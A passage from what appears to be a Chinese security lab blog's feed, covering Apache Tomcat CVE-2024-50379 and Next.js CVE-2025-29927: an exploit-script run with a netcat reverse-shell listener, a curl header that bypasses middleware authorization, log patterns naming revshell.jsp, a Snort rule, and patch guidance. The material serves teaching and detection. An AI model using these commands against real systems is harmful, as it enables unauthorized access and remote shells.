&lt;p&gt;接下来，在攻击机上，我们使用命令 &lt;code&gt;python3 ApachTomcat_CVE-2024-50379_ConditionalCompetitionToRce.py -u 10.10.211.24:8080&lt;/code&gt; 运行漏洞利用程序。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注 1：&lt;/strong&gt; 运行此命令将显示类似 &lt;code&gt;Checking http://10.10.211.24:8080/...&lt;/code&gt; 的消息，并且终端将停止显示更新几分钟。在此期间，漏洞代码会发送大量请求，导致目标服务器过载，并成功产生竞争条件。请等待脚本执行，同时观察终端运行 &lt;code&gt;netcat -lvnp 8888&lt;/code&gt; 命令的情况。耐心是关键。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注 2：&lt;/strong&gt; 由于这是一个竞争条件漏洞，您可能需要重复 PoC 多次才能成功。&lt;/p&gt;
&lt;p&gt;当漏洞利用成功时，将与正在监听的 &lt;code&gt;netcat&lt;/code&gt; 建立连接。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250417150039295.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250417150039295&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞检测&#34;&gt;漏洞检测
&lt;/h2&gt;&lt;p&gt;由于该漏洞依赖于竞争条件成功，并且每次利用尝试都需要上传文件，因此很容易在网络访问日志中检测到（默认位于 &lt;code&gt;C:\Program Files\Apache Software Foundation\&amp;lt;Tomcat Version&amp;gt;\logs\*access_log*&lt;/code&gt; 文件中）。对文件上传不受限制的网站进行的最简单攻击将记录如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;PUT&lt;/strong&gt; 请求上传带有大写（ &lt;strong&gt;.Jsp&lt;/strong&gt; 或 &lt;strong&gt;.JSP&lt;/strong&gt; ）扩展名的文件（ &lt;code&gt;&amp;quot;PUT /cve.Jsp&amp;quot;&lt;/code&gt; ）&lt;/li&gt;
&lt;li&gt;紧接着向同一个文件发出 &lt;strong&gt;GET&lt;/strong&gt; 请求，但现在是向 &lt;strong&gt;.jsp&lt;/strong&gt; 扩展名发出请求（ &lt;code&gt;&amp;quot;GET /cve.jsp&amp;quot;&lt;/code&gt; ）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;GET&lt;/strong&gt; 请求将记录 &lt;strong&gt;200&lt;/strong&gt; 或 &lt;strong&gt;404&lt;/strong&gt; 状态代码，具体取决于竞争条件是否成功&lt;/li&gt;
&lt;li&gt;重复上述步骤，直到竞争条件成功；通常需要 1000 次或更多次尝试&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:34 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;PUT /cve.Jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;201&lt;/span&gt; -
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:34 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /cve.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;749&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:39 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;PUT /cve.Jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;409&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;654&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:39 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /cve.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;749&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:39 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;PUT /cve.Jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;204&lt;/span&gt; -
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:39 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /cve.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;749&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:39 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;PUT /cve.Jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;204&lt;/span&gt; -
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:39 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /cve.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;假设目标 Web 服务器不允许通过 PUT 直接上传文件，但仍具有一些 Web 上传功能（例如图片或文件上传功能）。在这种情况下，攻击将具有类似的迭代模式：首先请求 Web 上传表单，然后请求上传的恶意 JSP 文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;223.199.178.14 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;31/Jan/2025:18:32:11 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;POST /app/template-upload.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;782&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;223.199.178.14 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;31/Jan/2025:18:32:11 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /uploads/revshell.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;749&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;223.199.178.14 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;31/Jan/2025:18:32:11 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;POST /app/template-upload.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;782&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;223.199.178.14 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;31/Jan/2025:18:32:11 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /uploads/revshell.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;749&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;223.199.178.14 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;31/Jan/2025:18:32:11 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;POST /app/template-upload.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;782&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;223.199.178.14 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;31/Jan/2025:18:32:11 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /uploads/revshell.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;系统日志&#34;&gt;系统日志
&lt;/h3&gt;&lt;p&gt;除了基于 Web 的检测之外，还可以使用默认的 Windows 事件日志或 Sysmon 等专用工具在操作系统和文件系统级别跟踪攻击。简而言之，可以围绕以下方面构建检测：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;文件创建&lt;/strong&gt; ：上传的 JSP 文件会保留在 Web 根目录中，除非威胁参与者手动删除它们。任何名称可疑的 JSP 文件（例如 &lt;code&gt;revshell.jsp&lt;/code&gt; ）或包含 &lt;code&gt;.exec()&lt;/code&gt; 等字符串的无法识别的 JSP 文件都可能表明存在攻击。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;进程执行&lt;/strong&gt; ：上传的 JSP 文件通常需要启动子进程才能实现代码执行。在 Windows 上，如果发现 Apache Tomcat 启动了 CMD 或 PowerShell 进程，则可能是另一个可靠的攻击指标。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;缓解措施&#34;&gt;缓解措施
&lt;/h2&gt;&lt;p&gt;务必检查是否已为 servlet 启用了 write 权限。如果默认配置保持不变，即 &lt;code&gt;readonly&lt;/code&gt; 未设置为 &lt;code&gt;false&lt;/code&gt; ，则不会受到影响。如果 readonly 已设置为 &lt;code&gt;false&lt;/code&gt; ，且您的用例不需要该权限，请将其重新设置为 &lt;code&gt;true&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;缓解措施已在&lt;a class=&#34;link&#34; href=&#34;https://lists.apache.org/thread/b2b9qrgjrz1kvo4ym8y2wkfdvwoq6qbp&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;官方公告&lt;/a&gt;中概述。用户应考虑以下两点。首先，用户应升级已安装的 Apache Tomcat。具体如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Apache Tomcat 11.0.0-M1 到 11.0.1 的用户应升级到 &lt;strong&gt;11.0.3&lt;/strong&gt; 或更高版本。&lt;/li&gt;
&lt;li&gt;Apache Tomcat 10.1.0-M1 到 10.1.33 的用户应升级到 &lt;strong&gt;10.1.35&lt;/strong&gt; 或更高版本。&lt;/li&gt;
&lt;li&gt;Apache Tomcat 9.0.0.M1 到 9.0.97 的用户应升级到 &lt;strong&gt;9.0.99&lt;/strong&gt; 或更高版本。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于仅升级到 11.0.2、10.1.34 或 9.98 的用户，需要执行其他步骤。特别是，旧版本 Java 的用户需要进行相关的显式更改：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在使用 Java 8 或 Java 11 的系统上，系统属性 &lt;code&gt;sun.io.useCanonCaches&lt;/code&gt; 应从默认值更改为 &lt;code&gt;false&lt;/code&gt; 。&lt;/li&gt;
&lt;li&gt;在使用 Java 17 的系统上，如果系统属性 &lt;code&gt;sun.io.useCanonCaches&lt;/code&gt; 的默认值已更改，则应将其恢复为 &lt;code&gt;false&lt;/code&gt; 。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;需要注意的是，Tomcat 11.0.3、10.1.35、9.0.99 及更高版本包含检查以确保 &lt;code&gt;sun.io.useCanonCaches&lt;/code&gt; 设置正确。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>CVE-2025-29927</title>
        <link>https://Yerucrem.github.io/p/cve-2025-29927/</link>
        <pubDate>Thu, 17 Apr 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/cve-2025-29927/</guid>
        <description>&lt;h1 id=&#34;nextjs-cve-2025-29927&#34;&gt;Next.js: CVE-2025-29927
&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述
&lt;/h2&gt;&lt;p&gt;Next.js 是由 Vercel 开发的 Web 开发框架，旨在简化高性能 Web 应用程序的创建。Next.js 构建于 React  之上，并通过添加多项功能（例如静态站点生成 (SSG) 和服务端渲染 (SSR)）扩展了 React 的功能。SSG  在构建时预生成页面，从而可以更快地交付给用户；此外，SSR 在请求时渲染页面，从而减少加载时间。简而言之，Next.js  添加了旨在提升性能和用户体验的功能。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2025-29927&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE -2025-29927&lt;/a&gt; 是 &lt;a class=&#34;link&#34; href=&#34;https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Rachid 和 Yasser Allam&lt;/a&gt; 最近在 Next.js  中发现的一个漏洞，该漏洞表明如果授权检查发生在中间件中，则有可能被绕过。中间件是授予开发人员控制传入请求的部分。它充当传入请求和路由系统之间的桥梁。路由系统是基于文件的，即通过组织文件和目录来创建和管理路由。此漏洞允许攻击者绕过基于中间件的授权，并且 14.2.25 和 15.2.3 之前的所有版本都容易受到此漏洞的影响。&lt;/p&gt;
&lt;p&gt;Next.js 广泛应用于各种类型的应用程序，包括电商平台、新闻应用、文档网站和交互式 Web 应用。因此，此漏洞可能造成严重后果，需要管理员将其安装升级到修补版本。&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用
&lt;/h2&gt;&lt;h3 id=&#34;curl&#34;&gt;Curl
&lt;/h3&gt;&lt;p&gt;Yunus Aydin 在 GitHub 上发布了一个概念验证 ( PoC )&lt;a class=&#34;link&#34; href=&#34;https://github.com/aydinnyunus/CVE-2025-29927&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 可利用的应用程序&lt;/a&gt;和漏洞代码。部署好之后可以通过访问 &lt;code&gt;http://10.10.134.123:3000&lt;/code&gt; 查看示例 Web 应用程序。但是，如果尝试访问 &lt;code&gt;http://10.10.134.123:3000/protected&lt;/code&gt; 上的受保护路由，将被重定向到主页。&lt;/p&gt;
&lt;p&gt;利用 CVE -2025-29927 漏洞非常简单；攻击者只需在请求中添加额外的 HTTP 标头 &lt;code&gt;x-middleware-subrequest: middleware&lt;/code&gt; 即可。正如披露此漏洞的&lt;a class=&#34;link&#34; href=&#34;https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;原始帖子&lt;/a&gt;中所述，添加 &lt;code&gt;x-middleware-subrequest&lt;/code&gt; 标头会导致请求被转发到其目的地，而无需中间件对其进行操作。因此，只需使用带有适当标头参数的 &lt;code&gt;curl&lt;/code&gt; 即可访问受保护的路由（即页面）。&lt;/p&gt;
&lt;p&gt;利用此漏洞我们可以访问受保护的页面。一个简单的方法是在终端中输入以下命令。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;x-middleware-subrequest: middleware&amp;#34;&lt;/span&gt; http://10.10.134.123:3000/protected
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该命令与普通的 &lt;code&gt;curl&lt;/code&gt; 命令类似，但有一个区别：它使用 &lt;code&gt;-H&lt;/code&gt; 选项（相当于 &lt;code&gt;--header&lt;/code&gt; 选项）向 HTTP GET 请求添加额外的标头。因此，上述 &lt;code&gt;curl&lt;/code&gt; 命令允许攻击者绕过所有安全控制并检索受保护的页面。&lt;/p&gt;
&lt;h3 id=&#34;burp-suite&#34;&gt;Burp Suite
&lt;/h3&gt;&lt;p&gt;使用 Burp Suite 也同样容易利用此漏洞。一种简单的方法是使用 Burp Suite 的浏览器，并在访问 &lt;code&gt;http://10.10.134.123:3000/protected&lt;/code&gt; 时修改请求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250417153324156.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250417153324156&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞检测&#34;&gt;漏洞检测
&lt;/h2&gt;&lt;p&gt;回想一下前面的任务，Next.js 的 CVE -2025-29927 是一个中间件授权绕过漏洞，导致能够访问以前需要此类授权的页面和路由。&lt;/p&gt;
&lt;p&gt;此任务将涵盖一些可用于通过日志和网络流量检测此类攻击发生的技术和规则。&lt;/p&gt;
&lt;h3 id=&#34;手动&#34;&gt;手动
&lt;/h3&gt;&lt;p&gt;Web 服务器日志可能有助于发现此类漏洞的证据。但这取决于 Web 服务器是否配置为记录 HTTP 标头。例如，NodeJS 允许通过 &lt;code&gt;request.headers[&#39;x-middleware-subrequest&#39;]&lt;/code&gt; 记录此特定的 HTTP 标头。&lt;/p&gt;
&lt;p&gt;如果 Web 应用程序使用了代理，则需要修改 Web 服务器（例如 Nginx 或 Apache2）上的日志配置，以记录此特定标头。例如，可以使用 Apache2 中的 &lt;strong&gt;LogFormat&lt;/strong&gt; ：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LogFormat &amp;#34;%h %l %u %t \&amp;#34;%r\&amp;#34; %&amp;gt;s %b \&amp;#34;%{Referer}i\&amp;#34; \&amp;#34;%{User-Agent}i\&amp;#34; \&amp;#34;%{x-middleware-subrequest}i\&amp;#34;&amp;#34; custom
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;一旦正确设置了此 HTTP 标头的日志记录，就可以使用 Grep、Yara 等常用工具。&lt;/p&gt;
&lt;h3 id=&#34;了解snort-v2&#34;&gt;[了解]Snort (v2)
&lt;/h3&gt;&lt;p&gt;以下 Snort 规则在用作 IDS 时可用于检测 CVE -2025-29927 的发生：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;alert tcp any any -&amp;gt; any any (msg: &amp;#34;HTTP &amp;#39;x-middleware-request&amp;#39; header detected, possible CVE-2025-29927 explotation&amp;#34;; content:&amp;#34;x-middleware-subrequest&amp;#34;;  rawbytes; sid:10000001; rev:1)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;此规则检查数据包时不考虑任何协议，例如 &lt;code&gt;http_headers&lt;/code&gt; 模块。这是因为在撰写本文时， HTTP 标头“x-middleware-request”在 Snort 中尚未被&lt;a class=&#34;link&#34; href=&#34;https://docs.snort.org/rules/options/payload/http/header&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;识别 &lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;首先，我们将 Snort 规则添加到本地规则中。默认情况下，在 Ubuntu 上，它位于 &lt;code&gt;/etc/snort/rules/local.rules&lt;/code&gt; 。现在，我们将上面的代码片段粘贴并保存。请注意，如果您已有规则，则需要将 &lt;code&gt;sid&lt;/code&gt; 值更改为其他值。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kali@yrc-2404:~$ sudo nano /etc/snort/rules/local.rules
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# $Id: local.rules,v 1.11 2004/07/23 20:14:44 bmc Exp $&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ----------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# LOCAL RULES&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ----------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# This file intentionally does not come with signatures.  Put your local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# additions here.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;alert tcp any any -&amp;gt; any any &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg: &lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP &amp;#39;x-middleware-request&amp;#39; header detected&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; content:&lt;span class=&#34;s2&#34;&gt;&amp;#34;x-middleware-subrequest&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;  rawbytes&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; sid:10000001&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; rev:1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
